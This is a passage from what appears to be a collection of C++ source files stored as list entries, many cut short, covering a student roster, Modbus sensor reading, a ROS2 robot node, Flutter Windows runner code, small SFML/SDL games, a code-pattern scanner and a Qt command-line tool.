THEN WE ADD ANOTHER IF CONDITION*/\n        \n        /*CHECKS IF THE NEXT CHARACTER IS E FOR SECURITY*/\n        if (allstudentdata[leftside + 1] == 'E') dp = SECURITY;\n        else if (allstudentdata[leftside + 1] == 'O') dp = SOFTWARE;\n        /*CHECKS IF THE NEXT CHARACTER IS 0 FOR SOFTWARE*/\n    } else if (allstudentdata[leftside] == 'N') {\n        dp = NETWORK;//CHECKS IF FIRST CHARACTER AFTER THE COMMA IS N FOR NETWORK\n    }\n    add(studentid, firstname, lastname, emailaddress, studentage, daysforcourse1, daysforcourse2, daysforcourse3, dp);//ADDING THE STUDENT TO THE ROSTER\n}\n    \n\n    \n\n\n\n void Roster::add(string studentID,string firstName,string lastName,string emailAddress,int age,int daysInCourse1, int daysInCourse2, int daysInCourse3, DegreeProgram degreeProgram){//FUNCTION TO ADD STUDENT TO THE ROSTER\n                                                \n     int daysinarray[3] = {daysInCourse1,daysInCourse2,daysInCourse3};\n// THE ARRAY STORES THE DAYS SPENTS IN EACH COURSE\n\n    \n     classRosterArray[++lastindex] = new Student(studentID, firstName, lastName, emailAddress,age,daysinarray,degreeProgram);/*ADDING THE STUDENT TO THE CLASSROSTERARRAY*/\n        \n    }\n\nvoid Roster::remove(string studentID) {\n    bool studentfound = false; /*initialize a boolean to track if the student was found*/\n    for (int i = 0; i <= lastindex; i++) { // doing a for loop\n        if (classRosterArray[i]->getStudentID() == studentID) {/*checking if the studentid matches the one to remove*/\n            delete classRosterArray[i]; // Delete the student object from memory\n            studentfound = true;\n            for (int j = i; j < lastindex; j++) {\n                classRosterArray[j] = classRosterArray[j + 1];\n            }/*shift the remaining students to fill the gaps and move the pointers down in the array*/\n            classRosterArray[lastindex] = nullptr; // Nullify the last element\n            lastindex--;\n            break;\n        }\n    }\n    if (studentfound) {\n        cout << \"Student with ID: \" << studentID << \" found and removed.\" << endl;\n    } else {\n        cout << \"Error: Student with ID \" << studentID << \" not found.\" << endl;\n    }\n}\n\n\nvoid Roster::printAll()\n{//prints out all students in the roster\n    St",
    "#include <ModbusRTU.h>\n#include <SoftwareSerial.h>\n\n#define TX_G16 16\n#define RX_G17 17\n#define RE_DE_ENABLE 15\n\nfloat InttoFloat(uint16_t Data0, uint16_t Data1){\n  float x;\n  unsigned long *p;\n\n  p = (unsigned long*)&x;\n  *p = (unsigned long)Data0 << 16 | Data1; //Bid-endian\n  return (x);\n}\nSoftwareSerial S(RX_G17, TX_G16); // RX, TX\nModbusRTU mb;\n\nbool cb(Modbus::ResultCode event, uint16_t transactionId, void* data){\n  if(event != Modbus::EX_SUCCESS){\n    Serial.print(\"Request result : 0x\");\n    Serial.print(event, HEX);\n  }\n  return true;\n}\n\n\nvoid setup() {\n  Serial.begin(9600);\n  S.begin(19200, SWSERIAL_8E1);\n  mb.begin(&S,RE_DE_ENABLE);\n  mb.master();\n\n}\n\nuint16_t val[2];\n\nvoid loop() {\n  \n  if (!mb.slave()) {\n    \n    mb.readHreg(2, 3926, val, 2, cb); // Slave id is 1 and register address is 3926 and \n    //we are reading 2 bytes from the register and saving in val\n    while(mb.slave()) { // Check if transaction is active\n      mb.task();\n      delay(100);\n    }\n    Serial.print(\"Register Values \");\n    Serial.print(val[0]);\n    Serial.print(\",\");\n    Serial.println(val[1]);\n    float voltage= InttoFloat(val[1],val[0]);\n    Serial.print(\"Voltage= \");\n    Serial.print(voltage);\n    Serial.println(\" V\");\n\n      }\n  delay(1000);\n}\n",
    "/*  \n*   A basic node for ros2 that runs with ariaCoda\n*   To run use 'ros2 run ariaNode ariaNode -rp /dev/ttyUSB0'\n*\n*   Author: Kieran Quirke-Brown\n*   Date: 12/01/2024\n*/\n\n#include <chrono>\n#include <functional>\n#include <memory>\n#include <string>\n#include <signal.h>\n\n#include <rclcpp/rclcpp.hpp>\n#include <geometry_msgs/msg/twist.hpp>\n\n# include \"Aria/Aria.h\"\n\n//used with signal handler as signal handler function doesn't accept parameters\nbool stopRunning = false;\n\nusing namespace std::chrono_literals;\n/*\n*   Basic ROS node that updates velocity of pioneer robot, Aria doesn't like\n*   being spun as a node therefore we just use a single subscriber\n*   parameters:\n*       forward and ratation speeds are float that are bound to the node\n*       but point at the same location as the aria velocities\n*/\nclass ariaNode : public rclcpp::Node {\n    public:\n        ariaNode(float* forwardSpeed, float* rotationSpeed) : Node(\"Aria_node\") {\n            currentForwardSpeed = forwardSpeed;\n            currentRotationSpeed = rotationSpeed;\n\n            cmdVelSub = create_subscription<geometry_msgs::msg::Twist> (\n                \"cmd_vel\", 10, std::bind(&ariaNode::cmdVelCallback, this, std::placeholders::_1)\n            );    \n        }\n\n    private:\n        void cmdVelCallback(const geometry_msgs::msg::Twist::SharedPtr msg) {\n            \n            double linearSpeed = msg->linear.x;\n            double angularSpeed = msg->angular.z;\n\n            *currentForwardSpeed = linearSpeed;\n            *currentRotationSpeed = angularSpeed;\n\n            RCLCPP_DEBUG(this->get_logger(), \"message received.\");\n\n        }\n\n        rclcpp::Subscription<geometry_msgs::msg::Twist>::SharedPtr cmdVelSub;\n        float* currentForwardSpeed;\n        float* currentRotationSpeed;\n    \n};\n\n// Deals with ctl+c handling to stop the motors correctly.\nvoid my_handler(int s){\n           printf(\"Caught signal %d\\n\",s);\n           stopRunning = true;\n}\n\nint main(int argc, char** argv) {\n    rclcpp::init(argc, argv);\n\n    Aria::init();\n    ArArgumentParser parser(&argc, argv);\n    parser.loadDefaultArguments();\n    ArRobot* robot;\n    robot = new ArRobot();\n\n    signal(SIGINT, my_handler);\n    \n    // RCLCPP_DEBUG(this->get_logger(),\"Trying to connect to robot...\");\n    ArRobotConnector robotConnector(&parser, robot);\n    if(!robotConnector.connectRobot()) {\n        ArLog::log(ArLog::Terse, \"simpleConnect: Could not connect to the robot.\");\n        if(parser.checkHelpAndWarnUnparsed()) {\n            Aria::logOptions();\n            Aria::exit(1);\n        }\n    }\n\n    robot->setAbsoluteMaxTransVel(400);\n\n    float forwardSpeed = 0.0;\n    float rotationSpeed = 0.0;\n    \n    \n    // RCLCPP_DEBUG(aNode->get_logger(),\"Run Async\");\n    robot->runAsync(true);\n    // RCLCPP_DEBUG(aNode->get_logger(),\"Enable Motors\");\n    robot->enableMotors();\n\n    auto aNode = std::make_shared<ariaNode>(&forwardSpeed, &rotationSpeed);\n    RCLCPP_DEBUG(aNode->get_logger(),\"Before Spin!...\");\n\n    /*\n     *   Aria does not like to run in a ros node therefore we run a while loop\n     *   that continuously spins the node to update velocities which are \n     *   then sent using the normal Aria commands.\n    */\n    while (!stopRunning) {\n        rclcpp::spin_some(aNode);\n        // RCLCPP_DEBUG(aNode->get_logger(), \"sending motor command.\");\n            robot->lock();\n            robot->setVel(forwardSpeed * 500);\n            robot->setRotVel(rotationSpeed * 50);\n            robot->unlock();\n            // RCLCPP_DEBUG(aNode->get_logger(), \"motor command sent.\");\n            // RCLCPP_DEBUG(aNode->get_logger(), \"forward speed is now %f.\", forwardSpeed);\n            // RCLCPP_DEBUG(aNode->get_logger(), \"rotational speed is now %f.\", rotationSpeed);\n    }\n    RCLCPP_DEBUG(aNode->get_logger(), \"After Spin\");\n\n    robot->disableMotors();\n    robot->stopRunning();\n    // wait for the thread to stop\n    robot->waitForRunExit();\n\n    // exit\n    RCLCPP_DEBUG(aNode->get_logger(), \"ending Aria node\");\n    Aria::exit(0);\n    return 0;\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"AnimatedGLTexture.h\"\n\nnamespace SDLFramework {\n\n\tvoid AnimatedGLTexture::RunAnimation() {\n\t\tif (!mAnim.done) {\n\t\t\tmAnim.frameTimer += mTimer->DeltaTime();\n\n\t\t\tif (mAnim.frameTimer >= mAnim.speed) {\n\t\t\t\tif (mAnim.wrapMode == Animation::WrapModes::Loop) {\n\t\t\t\t\t// reset timer, accounting for extra time\n\t\t\t\t\tmAnim.frameTimer -= mAnim.speed;\n\t\t\t\t}\n\t\t\t\telse {\n\t\t\t\t\tmAnim.done = true;\n\t\t\t\t\t// back up the timer to the last frame\n\t\t\t\t\tmAnim.frameTimer = mAnim.speed - mAnim.timePerFrame;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tif (mAnim.layout == Animation::Layouts::Horizontal) {\n\t\t\t\tmSourceRect.x = mAnim.startX + (int)(mAnim.frameTimer / mAnim.timePerFrame) * mWidth;\n\t\t\t}\n\t\t\telse {\n\t\t\t\tmSourceRect.y = mAnim.startY + (int)(mAnim.frameTimer / mAnim.timePerFrame) * mHeight;\n\t\t\t}\n\t\t}\n\t}\n\n\tAnimatedGLTexture::AnimatedGLTexture(std::string filename, int x, int y, int w, int h, int frameCount, float animationSpeed, Animation::Layouts layout, bool shouldScroll, bool managed)\n\t\t: GLTexture(filename, x, y, w, h, shouldScroll, managed) {\n\t\tmTimer = Timer::Instance();\n\n\t\tmAnim.startX = x;\n\t\tmAnim.startY = y;\n\n\t\tmAnim.frameCount = frameCount;\n\t\tmAnim.speed = animationSpeed;\n\t\tmAnim.timePerFrame = mAnim.speed / mAnim.frameCount;\n\t\tmAnim.frameTimer = 0.0f;\n\n\t\tmAnim.wrapMode = Animation::WrapModes::Loop;\n\t\tmAnim.layout = layout;\n\n\t\tmAnim.done = false;\n\t}\n\n\tAnimatedGLTexture::~AnimatedGLTexture() { }\n\n\tvoid AnimatedGLTexture::SetWrapMode(Animation::WrapModes wrapMode) {\n\t\tmAnim.wrapMode = wrapMode;\n\t}\n\n\tvoid AnimatedGLTexture::ResetAnimation() {\n\t\tmAnim.frameTimer = 0.0f;\n\t\tmAnim.done = false;\n\t}\n\n\tbool AnimatedGLTexture::IsAnimating() {\n\t\treturn !mAnim.done;\n\t}\n\n\tvoid AnimatedGLTexture::Update() {\n\t\tRunAnimation();\n\t}\n}",
    "#include <SFML/Graphics.hpp>\r\n#include <ctime>\r\n#include <iostream>\r\n\r\nusing namespace sf;\r\nusing namespace std;\r\n\r\nclass Plants\r\n{\r\nprotected:\r\n    int health;\r\n    int cost;\r\n\r\npublic:\r\n    Plants(int h, int c) : health(h), cost(c) {}\r\n\r\n    virtual void setPosition(float x, float y) = 0;\r\n    virtual void setTexture(const sf::Texture& texture) = 0;\r\n    virtual void draw(sf::RenderWindow& window) = 0;\r\n};\r\n\r\n\r\nclass Pea {\r\n    sf::Sprite sprite;\r\n    sf::Texture texture;\r\n    float speed;\r\n    bool active;  // To track if the pea is active and should be moved or drawn\r\n\r\npublic:\r\n    Pea() : speed(150.0f), active(false) {}\r\n\r\n    void activate(float x, float y) {\r\n        if (!texture.loadFromFile(\"Images/pea.png\")) {\r\n            std::cerr << \"Failed to load pea image\" << std::endl;\r\n        }\r\n        sprite.setTexture(texture);\r\n        sprite.setPosition(x, y);\r\n        active = true;\r\n    }\r\n\r\n    void update(float deltaTime) {\r\n        if (active) {\r\n            sprite.move(speed * deltaTime, 0); // Move right\r\n            if (sprite.getPosition().x > 1200) { // Assuming screen width is 1200\r\n                active = false;  // Deactivate if off screen\r\n            }\r\n        }\r\n    }\r\n\r\n    void draw(sf::RenderWindow& window) {\r\n        if (active) {\r\n            window.draw(sprite);\r\n        }\r\n    }\r\n\r\n    bool isActive() const {\r\n        return active;\r\n    }\r\n};\r\n\r\n\r\n\r\n\r\nclass Peashooter : public Plants\r\n{\r\n    sf::Sprite sprite;\r\n    sf::Texture texture;\r\n\r\n    Pea peas[40];  // Array of peas, assuming a max of 10 active peas at a time\r\n    float shootTimer;\r\n    const float shootInterval = 5.0f; // 8 seconds interval\r\n\r\npublic:\r\n    // Default constructor\r\n    Peashooter() : Plants(0, 0) {}\r\n\r\n    // Constructor with parameters for texture and position\r\n    Peashooter(const std::string& textureFile, float x, float y, int h = 0, int c = 0) : Plants(h, c)\r\n    {\r\n        if (!texture.loadFromFile(textureFile)) {\r\n            cerr << \"Failed to load peashooter image\" << endl;\r\n        }\r\n        sprite.setTexture(texture);\r\n        sprite.setPosition(x, y);\r\n        shootTimer = shootInterval;\r\n    }\r\n\r\n    void setPosition(float x, float y) override {\r\n        sprite.setPosition(x, y);\r\n    }\r\n\r\n    void setTexture(const sf::Texture& texture) override {\r\n        sprite.setTexture(texture);\r\n    }\r\n\r\n    void update(float deltaTime) {\r\n        // Shooting logic\r\n        if ((shootTimer -= deltaTime) <= 0) {\r\n            for (int i = 0; i < 40; i++) {\r\n                if (!peas[i].isActive()) {\r\n                    peas[i].activate(sprite.getPosition().x + sprite.getGlobalBounds().width,\r\n                        sprite.getPosition().y + sprite.getGlobalBounds().height / 2);\r\n                    break;\r\n                }\r\n            }\r\n            shootTimer = shootInterval;\r\n        }\r\n\r\n        // Update each active pea\r\n        for (int i = 0; i < 40; i++) {\r\n            peas[i].update(deltaTime);\r\n        }\r\n    }\r\n\r\n    void draw(sf::RenderWindow& window) {\r\n        window.draw(sprite);\r\n        for (int i = 0; i < 40; i++) {\r\n            peas[i].draw(window);\r\n        }\r\n    }\r\n\r\n    Vector2f getPosition() const {\r\n        return sprite.getPosition();\r\n    }\r\n};\r\n\r\n\r\n\r\nclass Sun {\r\n    sf::Sprite sprite;\r\n    sf::Texture texture;\r\n    bool active;\r\n    float timer;\r\n\r\npublic:\r\n    Sun() : active(false), timer(0) {}\r\n\r\n    void activate(float x, float y) {\r\n        if (!texture.loadFromFile(\"Images/sun.png\")) {\r\n            std::cerr << \"Failed to load sun image\" << std::endl;\r\n        }\r\n        active = true;\r\n        sprite.setTexture(texture);\r\n        sprite.setPosition(x, y + 20); // Position the sun slightly above the sunflower\r\n        timer = 10.0f; // Resets the timer for the next sun generation\r\n    }\r\n\r\n    void update(float deltaTime) {\r\n        if (active) {\r\n            timer -= deltaTime;\r\n            if (timer <= 8) {\r\n                active = false; // Automatically deactivate after 10 seconds if not clicked\r\n            }\r\n        }\r\n    }\r\n\r\n    void draw(sf::RenderWindow& window) {\r\n        if (active) {\r\n            window.draw(sprite);\r\n        }\r\n    }\r\n\r\n    bool contains(float x, float y) {\r\n        return sprite.getGlobalBounds().contains(x, y);\r\n    }\r\n\r\n    bool isActive() const {\r\n        return active;\r\n    }\r\n\r\n    void deactivate() {\r\n        active = false;\r\n    }\r\n};\r\n\r\n\r\n\r\n\r\nclass Sunflower : public Plants {\r\n    sf::Sprite sprite;\r\n    sf::Texture texture;\r\n    Sun sun; // Each sunflower has one sun at a time\r\n    int* currencyPtr;  // Pointer to the currency in the Game class\r\n    float generateSunTimer;  // Timer for generating suns\r\n\r\npublic:\r\n    // Default constructor\r\n\r\n    Sunflower() : Plants(0, 0), generateSunTimer(10.0f), currencyPtr(NULL) {}\r\n\r\n    Sunflower(const std::string& textureFile, float x, float y, int h, int c, int* Currency) : Plants(h, c), generateSunTimer(10.0f), currencyPtr(Currency) {\r\n        if (!texture.loadFromFile(textureFi",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <iostream>\n#include <fstream>\n#include <vector>\n#include <cstdio>\n#include <string>\n\nstd::vector<std::string> fileList;\nstd::vector<std::string> pyFilter;\nstd::vector<std::string> phpFilter;\nstd::vector<std::string> csFilter;\nstd::vector<std::string> warningList;\nint returnCode = 0;\n\nvoid createPhpFilter() {\n    std::ifstream conf(\"phpFilter.wwwqr\");\n    if (!conf.is_open()) {\n        std::cout << \"\\n\\nCould not open phpFilter.wwwqr.\\n\\n\";\n        return;\n    }\n    std::string line;\n    while(std::getline(conf, line)) {\n        phpFilter.emplace_back(line);\n    }\n    conf.close();\n}\n\nvoid createPyFilter() {\n    std::ifstream conf(\"pyFilter.wwwqr\");\n    if (!conf.is_open()) {\n        std::cout << \"\\n\\nCould not open pyFilter.wwwqr.\\n\\n\";\n        return;\n    }\n    std::string line;\n    while (std::getline(conf, line)) {\n        pyFilter.emplace_back(line);\n    }\n    conf.close();\n}\n\nvoid createCsFilter() {\n    std::ifstream conf(\"csFilter.wwwqr\");\n    if (!conf.is_open()) {\n        std::cout << \"\\n\\nCould not open csFilter.wwwqr.\\n\\n\";\n        return;\n    }\n    std::string line;\n    while (std::getline(conf, line)) {\n        csFilter.emplace_back(line);\n    }\n    conf.close();\n}\n\nvoid createFilters() {\n    createPhpFilter();\n    createPyFilter();\n    createCsFilter();\n}\n\nstd::string exec(const char* cmd) {\n    FILE* pipe = popen(cmd, \"r\");\n    if (!pipe) return \"ERROR\";\n    char buffer[128];\n    std::string result = \"\";\n    while (!feof(pipe)) {\n        if (fgets(buffer, 128, pipe) != NULL)\n            result += buffer;\n    }\n    pclose(pipe);\n    return result;\n}\n\nstd::string getExtentionName(std::string path) {\n    int pos = path.find_last_of('.');\n    if (pos != std::string::npos) {\n        return path.substr(pos + 1);\n    }\n    return \"\";\n}\n\nvoid setFileList() {\n    fileList.clear();\n    std::string tmpStr = exec(\"find ../ -type f\");\n    std::string cache = \"\";\n    for (char c : tmpStr) {\n        if (c == '\\n') {\n            fileList.emplace_back(cache);\n            cache = \"\";\n        }\n        else {\n            cache += c;\n        }\n    }\n}\n\nvoid checkFiles(const std::string &whitelistPath) {\n    for (auto& str : fileList) {\n        std::ifstream file(str);\n        std::string line;\n        if (!file.is_open()) {\n            continue;\n        }\n        //whitelist check\n        std::ifstream whitelist((\"../\" + whitelistPath).c_str());\n\n        if (whitelist.is_open()) {\n            std::string tmpWLine;\n            bool isWhite = false;\n            while (std::getline(whitelist, tmpWLine)) {\n                if (str == tmpWLine) {\n                    isWhite = true;\n                    break;\n                }\n            }\n            whitelist.close();\n            if (isWhite) {\n                continue;\n            }\n        }\n        else {\n            std::cout << \"\\n\\n\" << whitelistPath << \" file not found.\\n\\n\";\n        }\n        //\n        int lineCount = 0;\n\n        std::vector<std::string> activeFilter;\n\n        std::string file_ext = getExtentionName(str);\n\n        if (file_ext == \"php\") {\n            activeFilter = phpFilter;\n        }\n        else if (file_ext == \"py\") {\n            activeFilter = pyFilter;\n        }\n        else if (file_ext == \"cs\") {\n            activeFilter = csFilter;\n        }\n\n        while (std::getline(file, line)) {\n            ++lineCount;\n            for (auto& val : activeFilter) {\n                int tmpP = line.find(val);\n                if (tmpP != std::string::npos) {\n                    warningList.emplace_back(\"Error at line \" + std::to_string(lineCount) + \" in '\" + str + \"' Filter: (\" + val + \")\\n\");\n                    if (returnCode == 0) {\n                        returnCode = 1;\n                    }\n                }\n            }\n        }\n        file.close();\n    }\n}\n\nint main(int argc, char* argv[]) {\n    if (argc < 2) {\n        throw std::runtime_error(\"Error: no whitelist argument given.\\n\");\n    }\n    setFileList();\n    createFilters();\n    checkFiles(argv[1]);\n    for (auto& str : warningList) {\n        std::cout << str;\n    }\n    return returnCode;\n}\n",
    "#include \"btest.h\"\n#include \"mainwindow.h\"\n#include <QApplication>\n#include <QCommandLineParser>\n\n#include <iostream>\n\nint\nmain(int argc, char* argv[])\n{\n  int rv;\n  btest app(argc, argv);\n  QApplication::setApplicationName(\"btest\");\n  QApplication::setApplicationVersion(\"0.1\");\n\n  QCommandLineParser parser;\n  parser.setApplicationDescription(\"VSCP Boot Test helper\");\n  parser.addHelpOption();\n  parser.addVersionOption();\n\n  // interface (-i, --interface)\n  QCommandLineOption interfaceOption(\n    QStringList() << \"i\"\n                  << \"interface\",\n    QApplication::translate(\"main\", \"Client interface to use\"),\n    \"interface\",\n    \"socketcan\");\n  parser.addOption(interfaceOption);\n\n  // config (-b, --bootmode)\n  QCommandLineOption bootOption(\n    QStringList() << \"b\"\n                  << \"bootmode\",\n    QApplication::translate(\"main\", \"Start bootloader (non zero) or application firmware (0)\"),\n    \"mode\",\n    \"255\");\n  parser.addOption(bootOption);\n\n  // config (-B, --block)\n  QCommandLineOption blockOption(\n    QStringList() << \"B\"\n                  << \"block\"\n                  << \"blocksize\",\n    QApplication::translate(\"main\", \"Block info on the form 'size:count' where size is he size \"\n                                    \"of a block in bytes and count are the number of blocks of that size.\"),\n    \"blck:cnt\",\n    \"\");\n  parser.addOption(blockOption);\n\n  // config (-c, --config)\n  QCommandLineOption configOption(\n    QStringList() << \"c\"\n                  << \"config\",\n    QApplication::translate(\"main\", \"Configuration string for interface\"),\n    \"cfg1;cfg2;cfg2;...\",\n    \"vcan0\");\n  parser.addOption(configOption);\n\n  // GUID (-g, --guid)\n  QCommandLineOption guidOption(\n    QStringList() << \"g\"\n                  << \"guid\",\n    QApplication::translate(\"main\", \"GUID to use for this client\"),\n    \"guid\",\n    \"00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:01\");\n  parser.addOption(guidOption);\n\n  // host (-h, --host)\n  QCommandLineOption hostOption(\n    QStringList() << \"s\"\n                  << \"srv\"\n                  << \"host\"\n                  << \"server\",\n    QApplication::translate(\"main\", \"Server/Host to connect to\"),\n    \"host\",\n    \"localhost\");\n  parser.addOption(hostOption);\n\n  // port (-p, --port)\n  QCommandLineOption portOption(\n    QStringList() << \"p\"\n                  << \"port\"\n                  << \"remote-port\",\n    QApplication::translate(\"main\", \"Port to connect to\"),\n    \"port\",\n    \"1883\");\n  parser.addOption(portOption);\n\n  // user (-u, --user)\n  QCommandLineOption userOption(QStringList() << \"u\"\n                                              << \"user\",\n                                QApplication::translate(\"main\", \"Username\"),\n                                \"user\",\n                                \"vscp\");\n  parser.addOption(userOption);\n\n  // password (-p, --password)\n  QCommandLineOption passwordOption(QStringList() << \"P\"\n                                                  << \"password\",\n                                    QApplication::translate(\"main\", \"Password\"),\n                                    \"password\",\n                                  